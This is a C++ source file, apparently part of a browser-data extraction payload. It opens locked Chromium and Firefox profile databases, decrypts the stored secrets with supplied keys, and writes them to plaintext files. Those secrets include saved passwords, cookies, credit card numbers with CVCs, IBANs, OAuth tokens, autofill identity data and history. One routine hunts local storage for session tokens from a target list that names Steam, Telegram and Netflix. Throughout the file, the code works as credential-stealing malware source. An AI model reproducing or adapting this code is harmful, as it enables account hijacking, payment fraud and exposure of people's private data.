// ...existing code...
// ...existing code...

// ...existing code...
// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "data_extractor.hpp"
#include "handle_duplicator.hpp"
#include "../crypto/aes_gcm.hpp"
#include <fstream>
#include <sstream>
#include <iomanip>
#include <map>
#include <algorithm>

namespace Payload {

    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<std::vector<uint8_t>>& keys, const std::filesystem::path& outputBase, bool isGecko)
        : m_pipe(pipe), m_keys(keys), m_outputBase(outputBase), m_isGecko(isGecko) {}

    sqlite3* DataExtractor::OpenDatabase(const std::filesystem::path& dbPath) {
        sqlite3* db = nullptr;
        std::string uri = "file:" + dbPath.string() + "?nolock=1";
        if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr) != SQLITE_OK) {
            if (db) sqlite3_close(db);
            return nullptr;
        }
        return db;
    }

    sqlite3* DataExtractor::OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath) {
        sqlite3* db = OpenDatabase(dbPath);
        if (db) {
            sqlite3_stmt* stmt = nullptr;
            if (sqlite3_prepare_v2(db, "SELECT 1", -1, &stmt, nullptr) == SQLITE_OK) {
                if (sqlite3_step(stmt) == SQLITE_ROW) {
                    sqlite3_finalize(stmt);
                    return db;
                }
                sqlite3_finalize(stmt);
            }
            sqlite3_close(db);
            db = nullptr;
        }

        HandleDuplicator duplicator;

        auto tempDir = m_outputBase / ".temp";
        auto tempDbPath = duplicator.CopyLockedFile(dbPath, tempDir);

        if (!tempDbPath) {
            return nullptr;
        }

        m_tempFiles.push_back(*tempDbPath);

        return OpenDatabase(*tempDbPath);
    }

    void DataExtractor::CleanupTempFiles() {
        for (const auto& tempFile : m_tempFiles) {
            try {
                if (std::filesystem::exists(tempFile)) {
                    std::filesystem::remove(tempFile);
                }
            } catch (...) {
                // Ignore cleanup failures
            }
        }
        m_tempFiles.clear();

        try {
            auto tempDir = m_outputBase / ".temp";
            if (std::filesystem::exists(tempDir) && std::filesystem::is_empty(tempDir)) {
                std::filesystem::remove(tempDir);
            }
        } catch (...) {}
    }

    void DataExtractor::ProcessUnencrypted(const std::filesystem::path& profilePath, const std::string& browserName) {
        if (m_isGecko) return;

        auto profileOutDir = m_outputBase / browserName / profilePath.filename();

        // 1. History
        auto historyPath = profilePath / "History";
        if (std::filesystem::exists(historyPath)) {
            if (auto db = OpenDatabaseWithHandleDuplication(historyPath)) {
                std::filesystem::create_directories(profileOutDir);
                ExtractHistory(db, profileOutDir / "history.json");
                sqlite3_close(db);
            }
        }

        // 2. Bookmarks
        auto bookmarksPath = profilePath / "Bookmarks";
        if (std::filesystem::exists(bookmarksPath)) {
            std::filesystem::create_directories(profileOutDir);
            ExtractBookmarks(bookmarksPath, profileOutDir / "bookmarks.json");
        }

        // 3. Downloads (uses History DB)
        if (std::filesystem::exists(historyPath)) {
            if (auto db = OpenDatabaseWithHandleDuplication(historyPath)) {
                std::filesystem::create_directories(profileOutDir);
                ExtractDownloads(db, profileOutDir / "downloads.json");
                sqlite3_close(db);
            }
        }
    }

    void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
        if (m_isGecko) {
            ProcessGeckoProfile(profilePath, browserName);
            return;
        }

        auto profileOutDir = m_outputBase / browserName / profilePath.filename();

        m_pipe.Log("PROFILE:" + profilePath.filename().string());

        // 1. Cookies (JSON)
        auto cookiePath = profilePath / "Network" / "Cookies";
        if (std::filesystem::exists(cookiePath)) {
            if (auto db = OpenDatabaseWithHandleDuplication(cookiePath)) {
                std::filesystem::create_directories(profileOutDir);
                ExtractCookies(db, profileOutDir / "cookies.json");
                sqlite3_close(db);
            }
        }

        // 2. Passwords (TXT)
        auto loginPath = profilePath / "Login Data";
        if (std::filesystem::exists(loginPath)) {
            if (auto db = OpenDatabaseWithHandleDuplication(loginPath)) {
                std::filesystem::create_directories(profileOutDir);
                ExtractPasswords(db, profileOutDir / "passwords.txt");
                sqlite3_close(db);
            }
        }
        
        // 3. Local Storage (LevelDB/SQLite)
        auto lsPath = profilePath / "Local Storage";
        if (std::filesystem::exists(lsPath)) {
            std::filesystem::create_directories(profileOutDir);
            ExtractLocalStorage(lsPath, profileOutDir / "local_storage.txt");
        }

        // 6. Autofill & Web Data
        auto webDataPath = profilePath / "Web Data";
        if (std::filesystem::exists(webDataPath)) {
            if (auto db = OpenDatabaseWithHandleDuplication(webDataPath)) {
                std::filesystem::create_directories(profileOutDir);
                ExtractAutofill(db, profileOutDir / "autofill.txt");
                ExtractCards(db, profileOutDir / "cards.txt");
                sqlite3_close(db);
            }
        }

        CleanupTempFiles();
    }

    void DataExtractor::ExtractAutofill(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT full_name, company_name, address_line_1, city, zip_code, phone_number, email FROM autofill_profiles";
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            std::stringstream ss;
            ss << "----------------------------------------\n"
               << "Name:    " << (char*)sqlite3_column_text(stmt, 0) << "\n"
               << "Company: " << (char*)sqlite3_column_text(stmt, 1) << "\n"
               << "Address: " << (char*)sqlite3_column_text(stmt, 2) << ", " << (char*)sqlite3_column_text(stmt, 3) << " (" << (char*)sqlite3_column_text(stmt, 4) << ")\n"
               << "Phone:   " << (char*)sqlite3_column_text(stmt, 5) << "\n"
               << "Email:   " << (char*)sqlite3_column_text(stmt, 6) << "\n";
            entries.push_back(ss.str());
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::ofstream out(outFile);
            out << "=== AUTOFILL PROFILES ===\n\n";
            for (const auto& e : entries) out << e;
            m_pipe.Log("AUTOFILL:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractCookies(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value, samesite FROM cookies";
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        int total = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            total++;
            const void* blob = sqlite3_column_blob(stmt, 6);
            int blobLen = sqlite3_column_bytes(stmt, 6);
            if (blob && blobLen > 0) {
                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                bool isV20 = (blobLen > 3 && memcmp(blob, "v20", 3) == 0);

                std::optional<std::vector<uint8_t>> decrypted;
                for (const auto& key : m_keys) {
                    decrypted = Crypto::AesGcm::Decrypt(key, encrypted);
                    if (decrypted && !decrypted->empty()) break;
                }
                if (decrypted && !decrypted->empty()) {
                    std::string val;
                    if (isV20 && decrypted->size() > 32) {
                        val = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
                    } else {
                        val = std::string((char*)decrypted->data(), decrypted->size());
                    }
                    std::string domain = (char*)sqlite3_column_text(stmt, 0);
                    std::string name = (char*)sqlite3_column_text(stmt, 1);
                    std::string path = (char*)sqlite3_column_text(stmt, 2);
                    bool secure = sqlite3_column_int(stmt, 3) != 0;
                    bool httpOnly = sqlite3_column_int(stmt, 4) != 0;
                    std::string sameSite = (char*)sqlite3_column_text(stmt, 7);
                    std::stringstream ss;
                    ss << "{\n"
                       << "  \"domain\": \"" << EscapeJson(domain) << "\",\n"
                       << "  \"name\": \"" << EscapeJson(name) << "\",\n"
                       << "  \"value\": \"" << EscapeJson(val) << "\",\n"
                       << "  \"path\": \"" << EscapeJson(path) << "\",\n"
                       << "  \"secure\": " << (secure ? "true" : "false") << ",\n"
                       << "  \"httpOnly\": " << (httpOnly ? "true" : "false") << ",\n"
                       << "  \"sameSite\": \"" << EscapeJson(sameSite) << "\"\n"
                       << "}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) {
                out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            }
            out << "]";
            m_pipe.Log("COOKIES:" + std::to_string(entries.size()) + ":" + std::to_string(total));
        }
    }

    void DataExtractor::ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;
 
        std::ofstream out(outFile);
        out << "================================================================================\n";
        out << "                                BROWSER PASSWORDS                               \n";
        out << "================================================================================\n\n";
 
        int count = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 2);
            int blobLen = sqlite3_column_bytes(stmt, 2);
            if (blob && blobLen > 0) {
                std::vector<uint8_t> encrypted((uint8_t*)blob, (uint8_t*)blob + blobLen);
                bool isV20 = (blobLen > 3 && memcmp(blob, "v20", 3) == 0);
                
                std::optional<std::vector<uint8_t>> decrypted;
                for (const auto& key : m_keys) {
                    decrypted = Crypto::AesGcm::Decrypt(key, encrypted);
                    if (decrypted && !decrypted->empty()) break;
                }
 
                if (decrypted && !decrypted->empty()) {
                    std::string val;
                    // Pro-grade truncation: only skip 32 bytes if it's confirmed V20 ABE data
                    if (isV20 && decrypted->size() > 32) {
                        val = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
                    } else {
                        val = std::string((char*)decrypted->data(), decrypted->size());
                    }
 
                    const char* url_text = (const char*)sqlite3_column_text(stmt, 0);
                    const char* user_text = (const char*)sqlite3_column_text(stmt, 1);
                    std::string url = url_text ? url_text : "N/A";
                    std::string user = user_text ? user_text : "N/A";
 
                    out << "URL:      " << url << "\n"
                        << "User:     " << user << "\n"
                        << "Password: " << val << "\n"
                        << "--------------------------------------------------------------------------------\n";
                    count++;
                }
            }
        }
        sqlite3_finalize(stmt);
        m_pipe.Log("PASSWORDS_EXTRACTED:" + std::to_string(count));
    }

    void DataExtractor::ExtractCards(sqlite3* db, const std::filesystem::path& outFile) {
        // 1. Load CVCs
        std::map<std::string, std::string> cvcMap;
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT guid, value_encrypted FROM local_stored_cvc", -1, &stmt, nullptr) == SQLITE_OK) {
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* guid = (const char*)sqlite3_column_text(stmt, 0);
                const void* blob = sqlite3_column_blob(stmt, 1);
                int len = sqlite3_column_bytes(stmt, 1);
                if (guid && blob && len > 0) {
                    std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                    std::optional<std::vector<uint8_t>> dec;
                    for (const auto& key : m_keys) {
                        dec = Crypto::AesGcm::Decrypt(key, enc);
                        if (dec && !dec->empty()) break;
                    }
                    if (dec && !dec->empty()) cvcMap[guid] = std::string((char*)dec->data(), dec->size());
                }
            }
            sqlite3_finalize(stmt);
        }

        // 2. Extract Cards
        if (sqlite3_prepare_v2(db, "SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, nullptr) != SQLITE_OK) return;

        std::ofstream out(outFile);
        out << "================================================================================\n";
        out << "                                CREDIT CARD DATA                                \n";
        out << "================================================================================\n\n";

        int count = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* guid = (const char*)sqlite3_column_text(stmt, 0);
            const void* blob = sqlite3_column_blob(stmt, 4);
            int len = sqlite3_column_bytes(stmt, 4);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                std::optional<std::vector<uint8_t>> dec;
                for (const auto& key : m_keys) {
                    dec = Crypto::AesGcm::Decrypt(key, enc);
                    if (dec && !dec->empty()) break;
                }
                if (dec && !dec->empty()) {
                    std::string num((char*)dec->data(), dec->size());
                    std::string cvc = (guid && cvcMap.count(guid)) ? cvcMap[guid] : "N/A";
                    const char* name_text = (const char*)sqlite3_column_text(stmt, 1);
                    std::string name = name_text ? name_text : "No Name";
                    int month = sqlite3_column_int(stmt, 2);
                    int year = sqlite3_column_int(stmt, 3);
                    
                    out << "Cardholder: " << name << "\n"
                        << "Number:     " << num << "\n"
                        << "Expiry:     " << month << "/" << year << "\n"
                        << "CVC:        " << cvc << "\n"
                        << "--------------------------------------------------------------------------------\n";
                    count++;
                }
            }
        }
        sqlite3_finalize(stmt);
        m_pipe.Log("CARDS_EXTRACTED:" + std::to_string(count));
    }

    void DataExtractor::ExtractIBANs(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT value_encrypted, nickname FROM local_ibans", -1, &stmt, nullptr) != SQLITE_OK) return;

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 0);
            int len = sqlite3_column_bytes(stmt, 0);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                std::optional<std::vector<uint8_t>> dec;
                for (const auto& key : m_keys) {
                    dec = Crypto::AesGcm::Decrypt(key, enc);
                    if (dec && !dec->empty()) break;
                }
                if (dec && !dec->empty()) {
                    std::string val((char*)dec->data(), dec->size());
                    std::stringstream ss;
                    ss << "{\"nickname\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 1)) << "\","
                       << "\"iban\":\"" << EscapeJson(val) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("IBANS:" + std::to_string(entries.size()));
        }
    }

    void DataExtractor::ExtractTokens(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        bool hasBindingKey = true;
        
        if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token, binding_key FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) {
            hasBindingKey = false;
            if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token FROM token_service", -1, &stmt, nullptr) != SQLITE_OK) return;
        }

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const void* blob = sqlite3_column_blob(stmt, 1);
            int len = sqlite3_column_bytes(stmt, 1);
            
            if (blob && len > 0) {
                std::vector<uint8_t> enc((uint8_t*)blob, (uint8_t*)blob + len);
                std::optional<std::vector<uint8_t>> dec;
                for (const auto& key : m_keys) {
                    dec = Crypto::AesGcm::Decrypt(key, enc);
                    if (dec && !dec->empty()) break;
                }
                if (dec && !dec->empty()) {
                    std::string val((char*)dec->data(), dec->size());
                    std::string bindingKey = "";
                    
                    if (hasBindingKey) {
                        const void* bKeyBlob = sqlite3_column_blob(stmt, 2);
                        int bKeyLen = sqlite3_column_bytes(stmt, 2);
                        if (bKeyBlob && bKeyLen > 0) {
                            std::vector<uint8_t> encKey((uint8_t*)bKeyBlob, (uint8_t*)bKeyBlob + bKeyLen);
                            std::optional<std::vector<uint8_t>> decKey;
                            for (const auto& key : m_keys) {
                                decKey = Crypto::AesGcm::Decrypt(key, encKey);
                                if (decKey && !decKey->empty()) break;
                            }
                            if (decKey && !decKey->empty()) {
                                bindingKey = std::string((char*)decKey->data(), decKey->size());
                            }
                        }
                    }

                    std::stringstream ss;
                    ss << "{\"service\":\"" << EscapeJson((char*)sqlite3_column_text(stmt, 0)) << "\","
                       << "\"token\":\"" << EscapeJson(val) << "\","
                       << "\"binding_key\":\"" << EscapeJson(bindingKey) << "\"}";
                    entries.push_back(ss.str());
                }
            }
        }
        sqlite3_finalize(stmt);

        if (!entries.empty()) {
            std::filesystem::create_directories(outFile.parent_path());
            std::ofstream out(outFile);
            out << "[\n";
            for (size_t i = 0; i < entries.size(); ++i) out << entries[i] << (i < entries.size() - 1 ? ",\n" : "\n");
            out << "]";
            m_pipe.Log("TOKENS:" + std::to_string(entries.size()));
        }
    }

    std::string DataExtractor::FormatWebKitTimestamp(int64_t webkitTimestamp) {
        if (webkitTimestamp <= 0) return "Never";

        FILETIME ft;
        GetSystemTimeAsFileTime(&ft);
        ULARGE_INTEGER uli;
        uli.LowPart = ft.dwLowDateTime;
        uli.HighPart = ft.dwHighDateTime;
        
        int64_t currentMicroseconds = uli.QuadPart / 10;
        int64_t diff = currentMicroseconds - webkitTimestamp;
        
        if (diff < 0) return "Just now";
        
        int64_t seconds = diff / 1000000;
        int64_t minutes = seconds / 60;
        int64_t hours = minutes / 60;
        int64_t days = hours / 24;
        
        seconds %= 60;
        minutes %= 60;
        hours %= 24;
        
        std::stringstream ss;
        if (days > 0) ss << days << " day" << (days > 1 ? "s " : " ");
        if (hours > 0) ss << hours << " hour" << (hours > 1 ? "s " : " ");
        if (minutes > 0) ss << minutes << " minute" << (minutes > 1 ? "s " : " ");
        if (seconds > 0 || ss.str().empty()) ss << seconds << " sec";
        
        ss << " ago";
        return ss.str();
    }

    std::string DataExtractor::EscapeJson(const std::string& s) {
        std::ostringstream o;
        for (char c : s) {
            if (c == '"') o << "\\\"";
            else if (c == '\\') o << "\\\\";
            else if (c == '\b') o << "\\b";
            else if (c == '\f') o << "\\f";
            else if (c == '\n') o << "\\n";
            else if (c == '\r') o << "\\r";
            else if (c == '\t') o << "\\t";
            else if ('\x00' <= c && c <= '\x1f') o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
            else o << c;
        }
        return o.str();
    }

    void DataExtractor::ExtractHistory(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC";
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::ofstream out(outFile);
        out << "================================================================================\n";
        out << "                                BROWSER HISTORY                                 \n";
        out << "================================================================================\n\n";

        int count = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* url_text = (const char*)sqlite3_column_text(stmt, 0);
            const char* title_text = (const char*)sqlite3_column_text(stmt, 1);
            std::string url = url_text ? url_text : "N/A";
            std::string title = title_text ? title_text : "No Title";
            int visits = sqlite3_column_int(stmt, 2);
            int64_t time = sqlite3_column_int64(stmt, 3);

            out << "[" << FormatWebKitTimestamp(time) << "]\n"
                << "  Title:  " << title << "\n"
                << "  URL:    " << url << "\n"
                << "  Visits: " << visits << "\n"
                << "--------------------------------------------------------------------------------\n";
            count++;
        }
        sqlite3_finalize(stmt);
        m_pipe.Log("HISTORY:" + std::to_string(count));
    }

    void DataExtractor::ExtractDownloads(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* query = "SELECT target_path, tab_url, total_bytes, start_time, state FROM downloads ORDER BY start_time DESC";
        if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::ofstream out(outFile);
        out << "================================================================================\n";
        out << "                                DOWNLOAD HISTORY                                \n";
        out << "================================================================================\n\n";

        int count = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* path_text = (const char*)sqlite3_column_text(stmt, 0);
            const char* url_text = (const char*)sqlite3_column_text(stmt, 1);
            std::string path = path_text ? path_text : "Unknown Path";
            std::string url = url_text ? url_text : "N/A";
            long long size = sqlite3_column_int64(stmt, 2);
            int64_t time = sqlite3_column_int64(stmt, 3);
            int state = sqlite3_column_int(stmt, 4);

            std::string status = (state == 1) ? "COMPLETE" : (state == 4) ? "CANCELLED" : "IN_PROGRESS";

            out << "[" << FormatWebKitTimestamp(time) << "] -> " << status << "\n"
                << "  File:   " << std::filesystem::path(path).filename().string() << "\n"
                << "  Size:   " << (size / 1024) << " KB\n"
                << "  Source: " << url << "\n"
                << "  Path:   " << path << "\n"
                << "--------------------------------------------------------------------------------\n";
            count++;
        }
        sqlite3_finalize(stmt);
        m_pipe.Log("DOWNLOAD:" + std::to_string(count));
    }

    void DataExtractor::ExtractBookmarks(const std::filesystem::path& bookmarksPath, const std::filesystem::path& outFile) {
        std::ifstream in(bookmarksPath);
        if (!in) return;
        
        std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
        std::ofstream out(outFile);
        out << "================================================================================\n";
        out << "                                BROWSER BOOKMARKS                               \n";
        out << "================================================================================\n\n";

        size_t pos = 0;
        int count = 0;
        while ((pos = content.find("\"name\":", pos)) != std::string::npos) {
            size_t nameStart = content.find('"', pos + 7) + 1;
            size_t nameEnd = content.find('"', nameStart);
            if (nameStart == std::string::npos || nameEnd == std::string::npos) break;
            std::string name = content.substr(nameStart, nameEnd - nameStart);

            size_t urlPos = content.find("\"url\":", nameEnd);
            if (urlPos != std::string::npos && urlPos - nameEnd < 500) {
                size_t urlStart = content.find('"', urlPos + 6) + 1;
                size_t urlEnd = content.find('"', urlStart);
                if (urlStart != std::string::npos && urlEnd != std::string::npos) {
                    std::string url = content.substr(urlStart, urlEnd - urlStart);
                    out << "+ " << name << "\n  URL: " << url << "\n\n";
                    count++;
                    pos = urlEnd;
                    continue;
                }
            }
            pos = nameEnd;
        }
        m_pipe.Log("BOOKMARK:" + std::to_string(count));
    }

    void DataExtractor::ExtractLocalStorage(const std::filesystem::path& lsPath, const std::filesystem::path& outFile) {
        std::ofstream out(outFile);
        out << "================================================================================\n";
        out << "                                LOCAL STORAGE TOKENS                             \n";
        out << "================================================================================\n\n";

        // Target keys from the Supreme checklist
        const std::vector<std::string> targetKeys = {
            "token", "Token", "auth_token", "access_token", "sessionid", "session_id",
            "steamLogin", "tg_web_auth", "wad_session", "oauth_token", "SecureNetflixId", 
            "auth-token", "session-token", "authorization", "authtoken", "pass_token"
        };

        int count = 0;
        std::map<std::string, std::string> foundTokens;

        if (std::filesystem::exists(lsPath)) {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(lsPath)) {
                if (!entry.is_regular_file()) continue;
                
                std::string ext = entry.path().extension().string();
                if (ext != ".ldb" && ext != ".log") continue;

                std::ifstream in(entry.path(), std::ios::binary);
                if (!in) continue;

                std::string content((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
                
                for (const auto& key : targetKeys) {
                    size_t pos = 0;
                    while ((pos = content.find(key, pos)) != std::string::npos) {
                        // Look for a value nearby (LevelDB values usually follow keys)
                        // Heuristic "Supreme" scan for LevelDB values
                        size_t valStart = content.find_first_of(":{", pos + key.length());
                        if (valStart != std::string::npos && valStart - pos < 60) {
                            // Find the first likely string value start
                            size_t quoteStart = content.find('"', valStart);
                            if (quoteStart != std::string::npos && quoteStart - valStart < 15) {
                                size_t quoteEnd = content.find('"', quoteStart + 1);
                                if (quoteEnd != std::string::npos && (quoteEnd - quoteStart) > 10) {
                                    std::string value = content.substr(quoteStart + 1, quoteEnd - quoteStart - 1);
                                    
                                    // Validate: tokens are typically Alphanumeric + some symbols
                                    bool valid = true;
                                    int printables = 0;
                                    for (char c : value) {
                                        if (c >= 32 && c <= 126) printables++;
                                        else { valid = false; break; }
                                    }

                                    if (valid && printables > 10 && value.length() < 1024) {
                                        foundTokens[key + " (" + entry.path().filename().string() + ")"] = value;
                                    }
                                }
                            }
                        }
                        pos += key.length();
                    }
                }
            }
        }

        if (foundTokens.empty()) {
            out << "No high-value tokens found in current LevelDB logs.\n";
        } else {
            for (const auto& [key, val] : foundTokens) {
                out << "Key Source: " << key << "\n"
                    << "Value:      " << val << "\n"
                    << "--------------------------------------------------------------------------------\n";
                count++;
            }
        }

        out << "\n[INDEXED FILES]\n";
        for (const auto& entry : std::filesystem::recursive_directory_iterator(lsPath)) {
            if (entry.is_regular_file()) {
                out << " - " << entry.path().filename().string() << " [" << (entry.file_size() / 1024) << " KB]\n";
            }
        }

        m_pipe.Log("LS_TOKENS_FOUND:" + std::to_string(count));
    }

    void DataExtractor::ProcessGeckoProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
        auto profileOutDir = m_outputBase / browserName / profilePath.filename();

        // 1. Cookies
        auto cookiePath = profilePath / "cookies.sqlite";
        if (std::filesystem::exists(cookiePath)) {
            if (sqlite3* db = OpenDatabase(cookiePath)) {
                std::filesystem::create_directories(profileOutDir);
                ExtractFirefoxCookies(db, profileOutDir / "cookies.json");
                sqlite3_close(db);
            }
        }

        // 2. History & Bookmarks
        auto placesPath = profilePath / "places.sqlite";
        if (std::filesystem::exists(placesPath)) {
            if (sqlite3* db = OpenDatabase(placesPath)) {
                std::filesystem::create_directories(profileOutDir);
                ExtractFirefoxHistory(db, profileOutDir / "history.txt");
                ExtractFirefoxBookmarks(db, profileOutDir / "bookmarks.txt");
                sqlite3_close(db);
            }
        }

        CleanupTempFiles();
    }

    void DataExtractor::ExtractFirefoxCookies(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* sql = "SELECT host, path, name, value, expiry, isSecure, isHttpOnly FROM moz_cookies";

        if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::ofstream out(outFile);
        out << "[\n";
        bool first = true;
        int count = 0;

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            if (!first) out << ",\n";
            first = false;

            out << "  {\n";
            out << "    \"domain\": \"" << EscapeJson((const char*)sqlite3_column_text(stmt, 0)) << "\",\n";
            out << "    \"path\": \"" << EscapeJson((const char*)sqlite3_column_text(stmt, 1)) << "\",\n";
            out << "    \"name\": \"" << EscapeJson((const char*)sqlite3_column_text(stmt, 2)) << "\",\n";
            out << "    \"value\": \"" << EscapeJson((const char*)sqlite3_column_text(stmt, 3)) << "\",\n";
            out << "    \"expirationDate\": " << sqlite3_column_int64(stmt, 4) << ",\n";
            out << "    \"secure\": " << (sqlite3_column_int(stmt, 5) ? "true" : "false") << ",\n";
            out << "    \"httpOnly\": " << (sqlite3_column_int(stmt, 6) ? "true" : "false") << "\n";
            out << "  }";
            count++;
        }

        out << "\n]";
        sqlite3_finalize(stmt);
        m_pipe.Log("COOKIES:" + std::to_string(count) + ":" + std::to_string(count));
    }

    void DataExtractor::ExtractFirefoxHistory(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* sql = "SELECT url, title, visit_count, last_visit_date FROM moz_places WHERE visit_count > 0 ORDER BY last_visit_date DESC";

        if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::ofstream out(outFile);
        out << "================================================================================\n";
        out << "                                FIREFOX HISTORY                                 \n";
        out << "================================================================================\n\n";

        int count = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* url = (const char*)sqlite3_column_text(stmt, 0);
            const char* title = (const char*)sqlite3_column_text(stmt, 1);
            int visits = sqlite3_column_int(stmt, 2);
            int64_t lastVisit = sqlite3_column_int64(stmt, 3);

            out << "URL:    " << (url ? url : "") << "\n";
            out << "Title:  " << (title ? title : "No Title") << "\n";
            out << "Visits: " << visits << "\n";
            out << "Date:   " << FormatWebKitTimestamp(lastVisit) << "\n";
            out << "--------------------------------------------------------------------------------\n";
            count++;
        }

        sqlite3_finalize(stmt);
        m_pipe.LogDebug("Gecko History Extracted: " + std::to_string(count));
    }

    void DataExtractor::ExtractFirefoxBookmarks(sqlite3* db, const std::filesystem::path& outFile) {
        sqlite3_stmt* stmt;
        const char* sql = "SELECT b.title, p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1";

        if (sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr) != SQLITE_OK) return;

        std::ofstream out(outFile);
        out << "================================================================================\n";
        out << "                                FIREFOX BOOKMARKS                               \n";
        out << "================================================================================\n\n";

        int count = 0;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const char* title = (const char*)sqlite3_column_text(stmt, 0);
            const char* url = (const char*)sqlite3_column_text(stmt, 1);

            out << "Title: " << (title ? title : "No Title") << "\n";
            out << "URL:   " << (url ? url : "") << "\n";
            out << "--------------------------------------------------------------------------------\n";
            count++;
        }

        sqlite3_finalize(stmt);
        m_pipe.LogDebug("Gecko Bookmarks Extracted: " + std::to_string(count));
    }
} // namespace Payload
